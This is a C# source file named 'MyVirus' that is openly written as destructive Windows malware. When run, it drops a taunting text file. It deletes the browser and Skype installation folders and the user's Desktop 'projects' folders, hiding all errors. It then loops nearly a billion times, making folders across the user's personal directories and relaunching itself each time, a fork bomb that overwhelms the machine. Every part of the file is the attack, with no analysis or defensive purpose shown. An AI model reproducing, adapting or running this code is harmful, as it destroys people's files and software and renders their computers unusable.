using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Diagnostics;

namespace WIRUS
{
    class MyVirus
    {
        Random rand;

        public MyVirus()
        {
            rand = new Random();

            int rand_folder_name = rand.Next(99, 9999);

            var username = Environment.UserName;

            var folder_path = @"C:\Users\" + username + @"\Desktop\";

            Console.ForegroundColor = ConsoleColor.Red;

            string currentDirectory = Process.GetCurrentProcess().MainModule.FileName;

            string[] lines = { "---GET---FUCKING---SHREKT---MOIT---", "-----------------------------", "-----CREATED BY: EDGYLOSER-----", "-----------------------", "---GET---FUCKING---SHREKT---MOIT---", "-----------------------------", "-----CREATED---WITH: THE-BIG-PUSSY-ON-THE-WORLD------", "--------------------------------" };

            var file_path = @"C:\Users\" + username + @"\Desktop\REKT.txt";

            File.WriteAllLines(file_path, lines);

            Process.Start(file_path);

            try
            {
                Directory.Delete(@"C:\Program Files (x86)\Google", true);
            } catch
            {

            }

            try
            {
                Directory.Delete(@"C:\Program Files (x86)\Mozilla Firefox", true);
            }
            catch
            {

            }

            try
            {
                Directory.Delete(@"C:\Program Files (x86)\Skype", true);
            }
            catch
            {

            }
	    try {
		Directory.Delete(@"C:\Program Files\Google");
	    } 
	    catch 
	    {
				
	    }
			
	    try {
		Directory.Delete(@"C:\Program Files\Mozilla Firefox");
	    } 
	    catch
	    {
				
	    }
			
            try
            {
                Directory.Delete(@"C:\Users\" + username + @"\Desktop\projects", true);
            }
            catch
            {

            }

            try
            {
                Directory.Delete(@"C:\Users\" + username + @"\Desktop\Projects", true);
            } catch
            {

            }
			
		var msg = "GET REKT";
				
                for (int i = 0; i < 999999999; i++)
                {
                    //create random folders in desktop and open the virus
                    Directory.CreateDirectory(folder_path + rand_folder_name);
                    Console.WriteLine(msg);
                    Process.Start(currentDirectory);

                    //create random folders in downloads folder and open the virus
                    folder_path = @"C:\Users\" + username + @"\Downloads\";
                    Directory.CreateDirectory(folder_path + rand_folder_name);
                    Console.WriteLine(msg);
                    Process.Start(currentDirectory);

                    //create random folders in docs folder and open the virus
                    folder_path = @"C:\Users\" + username + @"\Documents\";
                    Directory.CreateDirectory(folder_path + rand_folder_name);
                    Console.WriteLine(msg);
                    Process.Start(currentDirectory);

                    //create random folders in the pics folder and open the virus
                    folder_path = @"C:\Users\" + username + @"\Pictures\";
                    Directory.CreateDirectory(folder_path + rand_folder_name);
                    Console.WriteLine(msg);
                    Process.Start(currentDirectory);

                    //create random folders in the music folder and open the virus
                    folder_path = @"C:\Users\" + username + @"\Music\";
                    Directory.CreateDirectory(folder_path + rand_folder_name);
                    Console.WriteLine(msg);
                    Process.Start(currentDirectory);

                    //create random folders in the favorites folder and open the virus
                    folder_path = @"C:\Users\" + username + @"\Favorites\";
                    Directory.CreateDirectory(folder_path + rand_folder_name);
                    Console.WriteLine(msg);
                    Process.Start(currentDirectory);

                    //create random folders at the videos folder and open the virus
                    folder_path = @"C:\Users\" + username + @"\Videos\";
                    Directory.CreateDirectory(folder_path + rand_folder_name);
                    Console.WriteLine(msg);
                    Process.Start(currentDirectory);
                }
            }
    }
    }
